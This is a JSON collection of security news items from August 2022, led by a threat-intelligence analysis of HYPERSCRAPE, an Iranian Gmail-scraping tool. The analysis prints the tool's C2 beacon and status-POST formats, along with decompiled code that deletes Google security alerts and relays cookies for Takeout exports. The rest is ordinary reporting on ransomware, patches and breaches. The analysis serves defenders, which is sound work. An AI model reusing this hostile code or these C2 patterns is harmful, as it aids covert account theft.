[
   {
      "time": "2022-08-25",
      "title": "New Iranian APT data extraction tool",
      "text": " Threat Analysis GroupAug 23, 2022min readHYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired. It spoofs the user agent to look like an outdated browser, which enables the basic HTML view in Gmail. Once logged in, the tool changes the account’s language settings to English and iterates through the contents of the mailbox, individually downloading messages as .eml files and marking them unread. After the program has finished downloading the inbox, it reverts the language back to its original settings and deletes any security emails from Google. Earlier versions contained the option to request data from Google Takeout, a feature which allows users to export their data to a downloadable archive file.The tool is written in .NET for Windows PCs and is designed to run on the attacker's machine. We tested HYPERSCRAPE in a controlled environment with a test Gmail Account, although functionality may differ for Yahoo! and Microsoft accounts. HYPERSCRAPE won't run unless in a directory with other file dependencies.HYPERSCRAPE file metadataWhen launched, the tool makes an HTTP GET request to a C2 to check for a response body of \"OK'' and will terminate if it's not found. In the version tested, the C2 was unobfuscated and stored as a hardcoded string. In later versions it was obfuscated with Base64.GET http://{C2}/Index.php?Ck=OK HTTP/1.1Host: {C2}Accept-Encoding: gzipConnection: Keep-AliveThe tool accepts arguments from the command line such as the mode of operation, an identifier string, and a path string to a valid cookie file. A new form is displayed if the information is not provided via command prompt.Initial form to specify operation parametersOnce provided, the data in the \"Identity\" field is sent to a C2 for confirmation. Again, the response is expected to be \"OK\".GET http://{C2}/Index.php?vubc={identity} HTTP/1.1Host: {C2}Accept-Encoding: gzipIf the cookie file path was not supplied via the command line, a new form will allow the operator to do so using drag and drop.The cookie drag and drop formAfter parsing, the cookies are inserted into a local cache used by the embedded web browser. A new folder named \"Download\" is created adjacent to the main binary. The browser then navigates to Gmail to begin the data collection.The user agent is spoofed so it appears like an outdated browser, which results in an error message and allows the attacker to enable the basic HTML view in Gmail.The error page from using an unsupported browserIf the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page.The login pageOnce the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not. The language is returned to its original setting when the run is finished.HYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download. It does the following for each email found:The emails are saved with \".eml\" extensions under the Downloads directory with the filename corresponding to the subject. A log file is written containing a count of the emails that were downloaded.When finished, a HTTP POST request is made to the C2 to relay the status and system information. The downloaded emails are not sent to the C2.POST http://{C2}/?Key={GUID}&Crc={Identifier}{\"appName\": \"Gmail Downloader\",\"targetname\": \"{Email}\",\"HostName\": \"REDACTED\",\"srcUserIP\": \"REDACTED\",\"actionType\": \"First\",\"timeOccurrence\": \"05/01/2022 05:50:31 PM\",\"OS\": \"REDACTED\",\"OSVersion\": \"REDACTED\",\"SystemModel\": \"REDACTED\",\"SystemType\": \"REDACTED\",\"srcName\": \"REDACTED\",\"srcOrgName\": \"REDACTED\"}The program will delete any security emails from Google generated by the attacker’s activity.private bool IsThereAnyEMail() {List < GeckoHtmlElement > list = (from x in this.geckoWebBrowser.Document.GetElementsByTagName(\"span\")where x.TextContent.StartsWith (\"Security alert\") || x.TextContent.StartsWith(\"Archive of Google data requested\") || x.TextContent.StartsWith(\"Your Google data archive is ready\") || x.TextContent.StartsWith(\"Your Google data is ready\") || x.TextContent.StartsWith(\"Critical security alert\") || x.TextContent.StartsWith(\"Access for less secure apps has been turned on\") || x.TextContent.StartsWith(\"Review blocked sign-in attempt\") || x.TextContent.StartsWith(\"Help us protect you: Security advice from Google\") || x.TextContent.StartsWith(\"Access for less secure apps has been turned on\")select x).ToList < GeckoHtmlElement > ();bool flag = list.Count == 0;return !flag;}When conducting a Takeout, the program will spawn a new copy of itself and initialize a pipe communication channel to relay the cookies and account name, both of which are required to accomplish the Takeout. When they are received, the browser navigates to the official Takeout link to request and eventually download the exported data.public void ManageTakeOut() {string text = \"PipeName\";Process process = new Process();process.StartInfo.Arguments = string.Format(\"PIPE Google \\\"{0}\\\"\", text);process.StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;process.Start();PipeCommunication pipeCommunication = new PipeCommunication(true, text);bool flag = false;while (!flag) {try {JsonInfo jsonInfo = pipeCommunication.Read();switch (jsonInfo.Type) {case JsonType.GetCookies:jsonInfo.Data = this.CookieText;pipeCommunication.Write(jsonInfo);break;case JsonType.TakeOutFile:flag = true;break;case JsonType.GetUsername:while (this.OperationObject.GetUsername() == null) {Thread.Sleep(1000);}jsonInfo.Data = this.OperationObject.GetUsername();pipeCommunication.Write(jsonInfo);break;}} catch (Exception) {bool hasExited = process.HasExited;if (hasExited) {flag = true;}}}pipeCommunication.Close();}C2s136.243.108.14173.209.51.54HYPERSCRAPE binaries03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e36935a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b892085afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca7986dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85fac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daaMicrosoft Live DLL1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23PDBE:\\Working\\Projects\\EmailDownloader\\EmailDownloaderCookieMode\\EmailDownloader\\obj\\Debug\\EmailDownloader.pdbE:\\Working\\Projects\\EmailDownloader\\EmailDownloaderCookieMode\\Mahdi\\LiveLib\\obj\\Release\\LiveLib.pdbGoogle's Threat Analysis Group analyzes recent state-sponsored campaigns exploiting the WinRAR vulnerability, CVE-2023-38831.This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q3 2023. It was last updated on November 8, 2023.Last week Google’s Threat Analysis Group (TAG), in partnership with The Citizen Lab, discovered an in-the-wild 0-day exploit chain for iPhones. Developed by the commerci…Threat Analysis Group shares findings on a new campaign by North Korean actors targeting security researchers.Threat Analysis Group shares their Q2 2023 bulletin."
   },
   {
      "time": "2022-08-25",
      "title": "Windows Terminal is now the default terminal in Windows 11 dev builds",
      "text": " Microsoft has finally made Windows Terminal the default terminal in Windows 11 Insider 'Dev' preview builds, bringing a new modern interface for all your command-line programs.In Windows 10 and Windows 11, opening a console program would cause the operating system to launch the program in a console window using the 'cmd.exe' command-line interpreter. Similarly, PowerShell would open in its own command line interface for executing commands.In both Windows 10 Insider builds and Windows 11, Microsoft has already integrated support for Windows Terminal into the operating system, letting you select it as your default console terminal.However, Microsoft had previously said they plan to make Windows Terminal the default console for everyone in 2022.Today, Microsoft has released Windows 11 'Dev' preview build 25188 and finally brings those plans to fruition, as in this build, Windows Terminal is now the default console when launching a command-line application or PowerShell script.For this change to occur, users must have Windows Terminal 1.15 or later installed, and in our tests, have opened the program at least once. Once set as the default terminal, any console programs will now automatically launch within Windows Terminal.This setting can be changed by going into Settings > Privacy & security > For developers and changing the 'Terminal' setting, which will now be set to 'Let Windows decide.'"
   },
   {
      "time": "2022-08-25",
      "title": "Quantum ransomware attack disrupts govt agency in Dominican Republic",
      "text": " The Dominican Republic's Instituto Agrario Dominicano has suffered a Quantum ransomware attack that encrypted multiple services and workstations throughout the government agency.Local media reports that the ransomware attack occurred on August 18th, which has impacted the agency's operation.The National Cybersecurity Center (CNCS), which has been assisting the agency recover from the attack, says that the IP addresses of the attackers were from the U.S. and Russia.\"The information was totally compromised, because the databases, applications, emails, etc., were affected,\" assured Núñez.The IAD has told local media that they only had basic security software on their systems, such as antivirus, and lack a dedicated security department.Our investigation discovered that the Quantum ransomware operation was behind the attack, which initially demanded a $650,000 ransom from the agency.The threat actors claimed to have stolen over 1TB of data and threatened to release it if IAD did not pay a ransom publicly.Quantum is becoming a major player among enterprise-targeting ransomware operations, linked to an attack on PFC that impacted over 650 healthcare orgs.The rebrand to Quantum occurred in August 2021, when their ransomware encryptor switched to adding the .quantum file extension to encrypted files' names. After that, however, the rebrand never became particularly active, with the operation mostly lying dormant.According to Advanced Intel's Yelisey Boguslavskiy, some of the Conti cybercrime syndicate joined the ranks of the Quantum operation, which also immediately saw an increase in attacks."
   },
   {
      "time": "2022-08-25",
      "title": "GitLab ‘strongly recommends’ patching critical RCE vulnerability",
      "text": " GitLab is urging users to install a security update for branches 15.1, 15.2, and 15.3 of its community and enterprise editions to fix a critical vulnerability that could enable an attacker to perform remote command execution via Github import.GitLab is a web-based Git repository for developer teams that need to manage their code remotely. It has approximately 30 million registered users and one million paying customers.The vulnerability addressed by this security update is tracked as CVE-2022-2884 and assigned a CVSS v3 criticality score of 9.9. It impacts all versions starting from 11.3.4 and up to 15.1.4, those between 15.2 and 15.2.3, and 15.3.Additionally, GitLab underlines that the deployment type (omnibus, source code, helm chart, etc.) doesn’t make a difference, as all of them are impacted.Remote command execution is a potent type of flaw, enabling remote attackers to run malicious code on the target machine, inject malware and backdoors, or take complete control of the vulnerable endpoint.Using this vulnerability, a threat actor could take control over the server, steal or delete source code, perform malicious commits, and more.The latest GitLab versions that address the problem are 15.3.1, 15.2.3, and 15.1.5, which users are advised to upgrade to immediately.If it's not possible to install the security updates for whatever reason, GitLab recommends applying a workaround consisting of disabling GitHub import, a tool used for importing entire software projects from GitHub to GitLab.To apply the workaround, following these steps:To verify that the workaround has been correctly implemented, follow these steps:Typically, powerful flaws enter active exploitation status a few days after they are disclosed through the release of security updates. Therefore, it is strongly advised to apply the recommended updates or mitigations as soon as possible."
   },
   {
      "time": "2022-08-25",
      "title": "Researchers: AiTM Attack are Targeting Google G-Suite Enterprise Users - CySecurity News - Latest Information Security and Hacking Incidents",
      "text": "  your nameYour Emailyour message"
   },
   {
      "time": "2022-08-25",
      "title": "\r\n\tPlex Suffers Data Breach, Warns Users to Reset Passwords - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistIn the communication message, the company said it discovered suspicious activity on one of its databases on Tuesday, August 23.\"We immediately began an investigation and it does appear that a third-party was able to access a limited subset of data that includes emails, usernames, and encrypted passwords,\" Plex wrote.The streaming platform did not confirm whether any personally identifiable information (PII) or private media libraries were compromised but did mention that all account passwords that could have been accessed were secured.\"Even though all account passwords that could have been accessed were hashed and secured in accordance with best practices, out of an abundance of caution we are requiring all Plex accounts to have their password reset,\" the Plex email reads.\"Rest assured that credit card and other payment data are not stored on our servers at all and were not vulnerable in this incident,\" the company added.Further, Plex asked customers to make sure the checkbox \"sign out connected devices after password change\" was ticked during the password-changing process.Since Plex sent out the email to warn users about the password breach, the Plex website has been generally slowed down, possibly due to multitudes of users rushing in to change their passwords. At the time of writing, however, the site seems to be loading normally."
   },
   {
      "time": "2022-08-25",
      "title": "\r\n\tWar in Ukraine Has Pushed Two-Thirds of Businesses to Change Cyber Strategy - Infosecurity Magazine\r\n",
      "text": " Reporter, Infosecurity MagazineThe research also found that, while 64% think the threat of physical war is a greater concern in their country than cyber-war, 68% have had more conversations about cybersecurity with their board and senior management in response to the Russia/Ukraine conflict.Overall, 66% of organizations have changed their cybersecurity strategy as a direct response to the conflict.“The reality is that geopolitics and kinetic warfare now must inform cybersecurity strategy. We’ve known for years that state-backed APT groups are using cybercrime to advance their nations’ wider political and economic goals,” said Kevin Bocek, VP for security strategy and threat intelligence at Venafi.Using these worrying findings, Kevin Bocek alerted: “Everyone is a target, and unlike a kinetic warfare attack, only you can defend your business against nation-state cyber-attacks. There is no cyber-Iron Dome or cyber-NORAD. Every CEO and board must recognize that cybersecurity is one of the top three business risks for everyone, regardless of industry.”"
   },
   {
      "time": "2022-08-25",
      "title": "RansomEXX claims ransomware attack on Sea-Doo, Ski-Doo maker",
      "text": " The RansomEXX ransomware gang is claiming responsibility for the cyberattack against Bombardier Recreational Products (BRP), disclosed by the company on August 8, 2022.The operational halt impacted production, too, and was expected to cause delays in certain transactions with customers and suppliers.BRP employs over 20,000 people, counts close to $6 billion in annual sales, and distributes various products in more than120 countries, so even a minimal disruption in its production can have a serious financial impact.On August 15, 2022, BRP provided an update on the situation, saying that four manufacturing sites in Canada, Finland, the U.S., and Austria resumed production, with the rest to follow suit by the end of that week.In the same statement, the company presented the first results of its internal investigation, saying that the hackers breached its systems via a supply chain attack.\"At this time, while the investigation is still ongoing, it has not revealed any evidence that its clients' personal information would have been affected by the attack\" - Bombardier Recreational ProductsBRP promised to notify individuals or corporations directly if the ongoing investigation reveal a more widespread data breach.Yesterday, the RansomEXX gang listed Bombardier Recreational Products on its leak site along with 29.9GB of files allegedly stolen from the firm.The samples provided on the onion site include non-disclosure agreements, passports and IDs, material supply agreements, contract renewals, and more.It appears that the data breach doesn't include sensitive customer data, yet the exposure of the said documents is still damaging for BRP.\"BRP confirms that it has already contacted the very few employees who may have been impacted by the incident. The appropriate resources have been made available to them, including credit monitoring services\" - Bombardier Recreational Products\"Based on the current status of its investigation, BRP also believes that the compromised information relating to certain of its suppliers is limited in quantity and sensitivity, and is in the process of contacting them,\" the company added."
   },
   {
      "time": "2022-08-25",
      "title": "Hackers use AiTM attack to monitor Microsoft 365 accounts for BEC scams",
      "text": " A new business email compromise (BEC) campaign has been discovered combining sophisticated spear-phishing with Adversary-in-The-Middle (AiTM) tactics to hack corporate executives' Microsoft 365 accounts, even those protected by MFA.By accessing accounts of high-ranking employees like CEOs or CFOs of large organizations, the threat actors can monitor communications and respond to emails at the right moment to divert a large transaction to their bank accounts.This is typical of business email compromise attacks where the threat actors send an email from the compromised account at the last moment, requesting the authorizing member of the transaction to change the bank account destination.Researchers at Mitiga discovered the new campaign during an incident response case and report it's widespread now, targeting transactions of up to several million USD each.The phishing emails sent in these attacks tell the target that the corporate bank account they usually send payments to has been frozen due to a financial audit, enclosing new payment instructions that switch to the account of an alleged subsidiary. However, this new bank account is owned by the threat actors who steal the payment.To trick the recipients, the attacker hijacks email threads and uses typosquatting domains that quickly pass as authentic to CCed legal representatives the victim knows, involving them in the exchange.The attack on the company executives begins with a phishing email made to appear as if it originates from DocuSign, an electronic agreements management platform used extensively in corporate environments.While the email doesn't pass DMARC checks, Mitiga found that common security misconfigurations applied to reduce false positive spam alerts from DocuSign help it land in the target's inbox.When the \"Review Document\" button is clicked, the victim is taken to a phishing page on a spoofed domain where the recipient is asked to log in to the Windows domain.During AiTM attacks, tools like evilginx2 act as proxies that sit in the middle between a phishing page and a legitimate login form for a targeted company.As the proxy sits in the middle, when a victim enters their credentials and solves the MFA question, the proxy steals the session cookie generated by the Windows domain.The threat actors can now load the stolen session cookies into their own browsers to automatically log into the victim's account and bypass MFA, which had been verified in the previous login.Because valid sessions can expire or be revoked, the threat actors add a new MFA device and link it to the breached Microsoft 365 account, a move that doesn't generate any alerts or require further interaction with the original account owner.In the case seen by Mitiga, the threat actor added a mobile phone as the new authentication device, ensuring their uninterrupted access to the compromised account.According to the researchers, the threat actors leveraged this stealthy breach to access Exchange and SharePoint almost exclusively. According to the logs, they took no action on the victim's inbox, presumably only reading emails.However, the threat actor was likely waiting for the right moment to inject their own emails to divert invoice payments to bank accounts under the attackers' control."
   },
   {
      "time": "2022-08-25",
      "title": "\r\n\tVMware fixes privilege escalation vulnerabilities in VMware Tools - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistThe company made the announcement in an advisory on Tuesday August 23, saying the vulnerability (tracked CVE-2022-31676) could be exploited by threat actors with local non-administrative access to the Guest OS and used to escalate privileges as a root user in the virtual machine (VM).“VMware Tools was impacted by a local privilege escalation vulnerability,” the advisory reads. “Updates are available to remediate this vulnerability in affected VMware products.”The company evaluated the severity of this issue to be in the Important severity range with a maximum Common Vulnerability Scoring System (CVSS) base score of 7.0.VMware Tools is a suite of software tools used to improve the performance of the VM's guest operating system as well as the resource management of the virtual machine itself. CVE-2022-31676 was patched by VMware in version 12.1.0 for Windows and 10.3.25 for Linux machines."
   }
]